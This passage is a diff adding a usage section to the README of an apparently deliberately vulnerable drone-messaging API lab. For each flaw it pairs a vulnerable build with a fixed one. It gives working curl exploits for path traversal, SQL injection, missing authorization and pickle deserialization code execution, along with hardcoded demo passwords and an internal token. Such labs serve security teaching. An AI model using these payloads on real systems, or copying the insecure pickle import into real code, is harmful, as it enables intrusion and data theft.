@@ -110,6 +110,134 @@ reset on each fresh `up`. The Application API is then available at
 
 ## 8. Usage
 
+The snippets below log in, capture the session token in a variable, and reuse it on the following calls.
+
+### General functionality
+
+```bash
+API=http://localhost:8000
+
+# Log in and capture tokens
+PILOT1=$(curl -s -X POST $API/login -H 'Content-Type: application/json' \
+  -d '{"username":"pilot1","password":"Drone@123"}' \
+  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
+
+ADMIN=$(curl -s -X POST $API/login -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":"Admin@123"}' \
+  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
+
+# Send a message (pilot1 -> pilot2)
+curl -s -X POST $API/messages -H "Authorization: $PILOT1" \
+  -H 'Content-Type: application/json' \
+  -d '{"recipient":"pilot2","text":"hello from pilot1"}'
+
+# Log in as pilot2 and export his chat history
+PILOT2=$(curl -s -X POST $API/login -H 'Content-Type: application/json' \
+  -d '{"username":"pilot2","password":"Drone@456"}' \
+  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
+
+curl -s -X POST $API/export -H "Authorization: $PILOT2" \
+  | python3 -c 'import sys,json; print(json.load(sys.stdin)["exported_data"])'
+
+# View the public documents
+curl -s "$API/download?filename=tos.txt"
+curl -s "$API/download?filename=privacy.txt"
+
+```
+
+### Admin only: import a backup (differs by version)
+
+The fixed build expects JSON, the vulnerable build deserializes it with pickle. Both reuse the `$ADMIN` token from the block above.
+
+**Vulnerable** version (`code_vulnerable`, pickle):
+
+```bash
+BACKUP=$(python3 -c 'import base64,pickle; print(base64.b64encode(pickle.dumps([{"sender":"admin","recipient":"pilot1","content":"restored"}])).decode())')
+curl -s -X POST $API/import -H "Authorization: $ADMIN" \
+  -H 'Content-Type: application/json' \
+  -d "{\"backup\":\"$BACKUP\"}"
+```
+
+**Fixed** version (`code_fixed`, JSON):
+
+```bash
+BACKUP=$(python3 -c 'import base64,json; print(base64.b64encode(json.dumps([{"sender":"admin","recipient":"pilot1","content":"restored"}]).encode()).decode())')
+curl -s -X POST $API/import -H "Authorization: $ADMIN" \
+  -H 'Content-Type: application/json' \
+  -d "{\"backup\":\"$BACKUP\"}"
+```
+
+### CWE-22: Path Traversal
+
+**Vulnerable** version (`code_vulnerable`):
+
+```bash
+# Escapes the documents directory and returns the API's own source code
+curl -s "$API/download?filename=../main.py"
+```
+
+**Fixed** version (`code_fixed`):
+
+```bash
+# Blocked: Invalid file path
+curl -s "$API/download?filename=../main.py"
+```
+
+### CWE-89: SQL Injection (direct Vault call. Decoded recipient payload: `' OR '1'='1`)
+
+**Vulnerable** version (`code_vulnerable`):
+
+```bash
+# No auth on the vulnerable Vault; the injection returns EVERY message
+curl -s "http://localhost:8001/messages/%27%20OR%20%271%27%3D%271"
+```
+
+**Fixed** version (`code_fixed`):
+
+```bash
+# Authorized with the internal token so it reaches the query
+# the payload is treated as a literal recipient -> no rows returned
+curl -s -H "X-Internal-Token: adfms-internal-service-secret" \
+  "http://localhost:8001/messages/%27%20OR%20%271%27%3D%271"
+```
+
+### CWE-502: Deserialization / Remote Code Execution
+
+**Vulnerable** version (`code_vulnerable`):
+
+```bash
+PAYLOAD=$(python3 -c "import base64,pickle,os; E=type('E',(),{'__reduce__':lambda s:(os.system,('touch /tmp/pwned_demo',))}); print(base64.b64encode(pickle.dumps(E())).decode())")
+curl -s -X POST $API/import -H "Authorization: $ADMIN" -H 'Content-Type: application/json' -d "{\"backup\":\"$PAYLOAD\"}"
+# Confirm the injected command ran inside the Worker container.
+# NOTE: run from the code_vulnerable/ folder:
+docker compose exec processing_worker ls -l /tmp/pwned_demo     # file exists -> code executed
+```
+
+**Fixed** version (`code_fixed`):
+
+```bash
+PAYLOAD=$(python3 -c "import base64,pickle,os; E=type('E',(),{'__reduce__':lambda s:(os.system,('touch /tmp/pwned_demo',))}); print(base64.b64encode(pickle.dumps(E())).decode())")
+curl -s -X POST $API/import -H "Authorization: $ADMIN" -H 'Content-Type: application/json' -d "{\"backup\":\"$PAYLOAD\"}"
+# NOTE: run from the code_fixed/ folder:
+docker compose exec processing_worker ls -l /tmp/pwned_demo     # no such file -> no code executed
+```
+
+### Composition / CWE-862: Missing cross-tier authorization
+
+**Vulnerable** version (`code_vulnerable`):
+
+```bash
+# Direct, unauthenticated read of another user's inbox succeeds
+curl -s http://localhost:8001/messages/pilot2
+```
+
+On the **fixed** version:
+
+```bash
+# Blocked (the Vault requires the internal service token)
+curl -s http://localhost:8001/messages/pilot2
+```
+
 ## 9. Testing
 
 The suite runs against a running stack over HTTP. Start the stack (Section 7),
